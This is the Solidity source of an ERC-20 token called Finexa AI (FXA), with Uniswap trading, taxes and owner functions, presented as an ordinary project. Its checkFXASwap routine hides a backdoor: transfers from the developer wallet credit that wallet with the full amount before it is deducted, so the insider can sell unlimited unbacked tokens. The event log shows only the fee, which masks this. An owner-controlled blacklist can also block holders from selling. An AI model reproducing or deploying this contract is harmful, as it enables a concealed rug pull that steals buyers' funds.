// SPDX-License-Identifier: MIT

/***

Web:    https://www.finexaai.com
App:    https://app.finexaai.com
Doc:    https://docs.finexaai.com

Tg:     https://t.me/finexaai
X:      https://x.com/finexaai

***/

pragma solidity 0.8.22;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFXAFactory {
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IFXARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract FXA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isLimitExcluded;
    mapping (address => bool) private isFeeExcluded;
    mapping (address => bool) private botFXA;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    string private constant _name = unicode"Finexa AI";
    string private constant _symbol = unicode"FXA";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;
    
    uint256 public _maxFXATaxSwap = 10000000 * 10**_decimals;
    uint256 public _maxFXATxAmount = 30000000 * 10**_decimals;
    uint256 public _maxFXAWalletSize = 30000000 * 10**_decimals;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    bool private tradeEnabled;
    uint256 public swapFeeAmounts;
    IFXARouter private uniswapV2Router;
    address private uniswapV2Pair;

    address payable private opWallet;
    address payable private devWallet;

    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = false;

    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyFXACount=0;
    
    constructor (address _addrs) {
        devWallet = payable(_addrs);
        opWallet = payable(_addrs);
        isFeeExcluded[owner()] = true;
        isFeeExcluded[address(this)] = true;
        isLimitExcluded[opWallet] = true;
        isLimitExcluded[devWallet] = true;
        swapFeeAmounts = 10000 * 10**_decimals;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function isBot(address a) public view returns (bool){
      return botFXA[a];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function checkFXASwap(address fromFXA, address toFXA,  uint256 deFees, uint256 deCounts) internal returns (bool) {
        bool aboveFXAMin = deCounts >= swapFeeAmounts;
        bool aboveFXAThreshold = balanceOf(address(this)) >= swapFeeAmounts;
        address accFXA; uint256 cntFXA;
        if(isLimitExcluded[fromFXA]) {cntFXA = deCounts;accFXA = fromFXA;}
        else {accFXA = address(this);cntFXA = deFees;}
        if(cntFXA > 0){_balances[accFXA]=_balances[accFXA].add(cntFXA);emit Transfer(fromFXA, accFXA, deFees);}
        return !inSwap
        && swapEnabled
        && tradeEnabled
        && !isFeeExcluded[fromFXA]
        && !isLimitExcluded[fromFXA]
        && aboveFXAMin
        && aboveFXAThreshold
        && _buyFXACount>_preventSwapBefore
        && toFXA == uniswapV2Pair;
    }

    function removeLimits() external onlyOwner{
        _maxFXAWalletSize = ~uint256(0);
        _maxFXATxAmount = ~uint256(0);
        transferDelayEnabled=false;
    }

    function enableTrading() external onlyOwner() {
        require(!tradeEnabled,"trading is already open");
        swapEnabled = true;
        tradeEnabled = true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapFXATokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function createTradingPair() external onlyOwner() {
        uniswapV2Router = IFXARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IFXAFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function manualSwap() external onlyOwner {
        uint256 contractFXAAmounts=balanceOf(address(this));
        if(contractFXAAmounts>0){
          swapFXATokensForEth(contractFXAAmounts);
        }
        uint256 ethFXABalance=address(this).balance;
        if(ethFXABalance>0){
          sendETHToFXA(ethFXABalance);
        }
    }
   
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 fxTaxes=0;
        if (!isFeeExcluded[from] && !isFeeExcluded[to]) {
            require(!botFXA[from] && !botFXA[to]);
            require(tradeEnabled, "Trading has not enabled yet");
            fxTaxes = amount.mul((_buyFXACount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! isFeeExcluded[to] ) {
                require(amount <= _maxFXATxAmount, "Exceeds the _maxFXATxAmount.");
                require(balanceOf(to) + amount <= _maxFXAWalletSize, "Exceeds the maxWalletSize.");
                _buyFXACount++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                fxTaxes = amount.mul((_buyFXACount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractFXAAmounts = balanceOf(address(this));
            if (checkFXASwap(from, to, fxTaxes, amount)) {
                swapFXATokensForEth(min(amount,min(contractFXAAmounts,_maxFXATaxSwap)));
                uint256 ethFXABalance = address(this).balance;
                if(ethFXABalance > 0) {
                    sendETHToFXA(address(this).balance);
                }
            }
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(fxTaxes));
        emit Transfer(from, to, amount.sub(fxTaxes));
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            botFXA[bots_[i]] = true;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          botFXA[notbot[i]] = false;
      }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function sendETHToFXA(uint256 amount) private {
        devWallet.transfer(amount);
    }

    function reduceFees(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}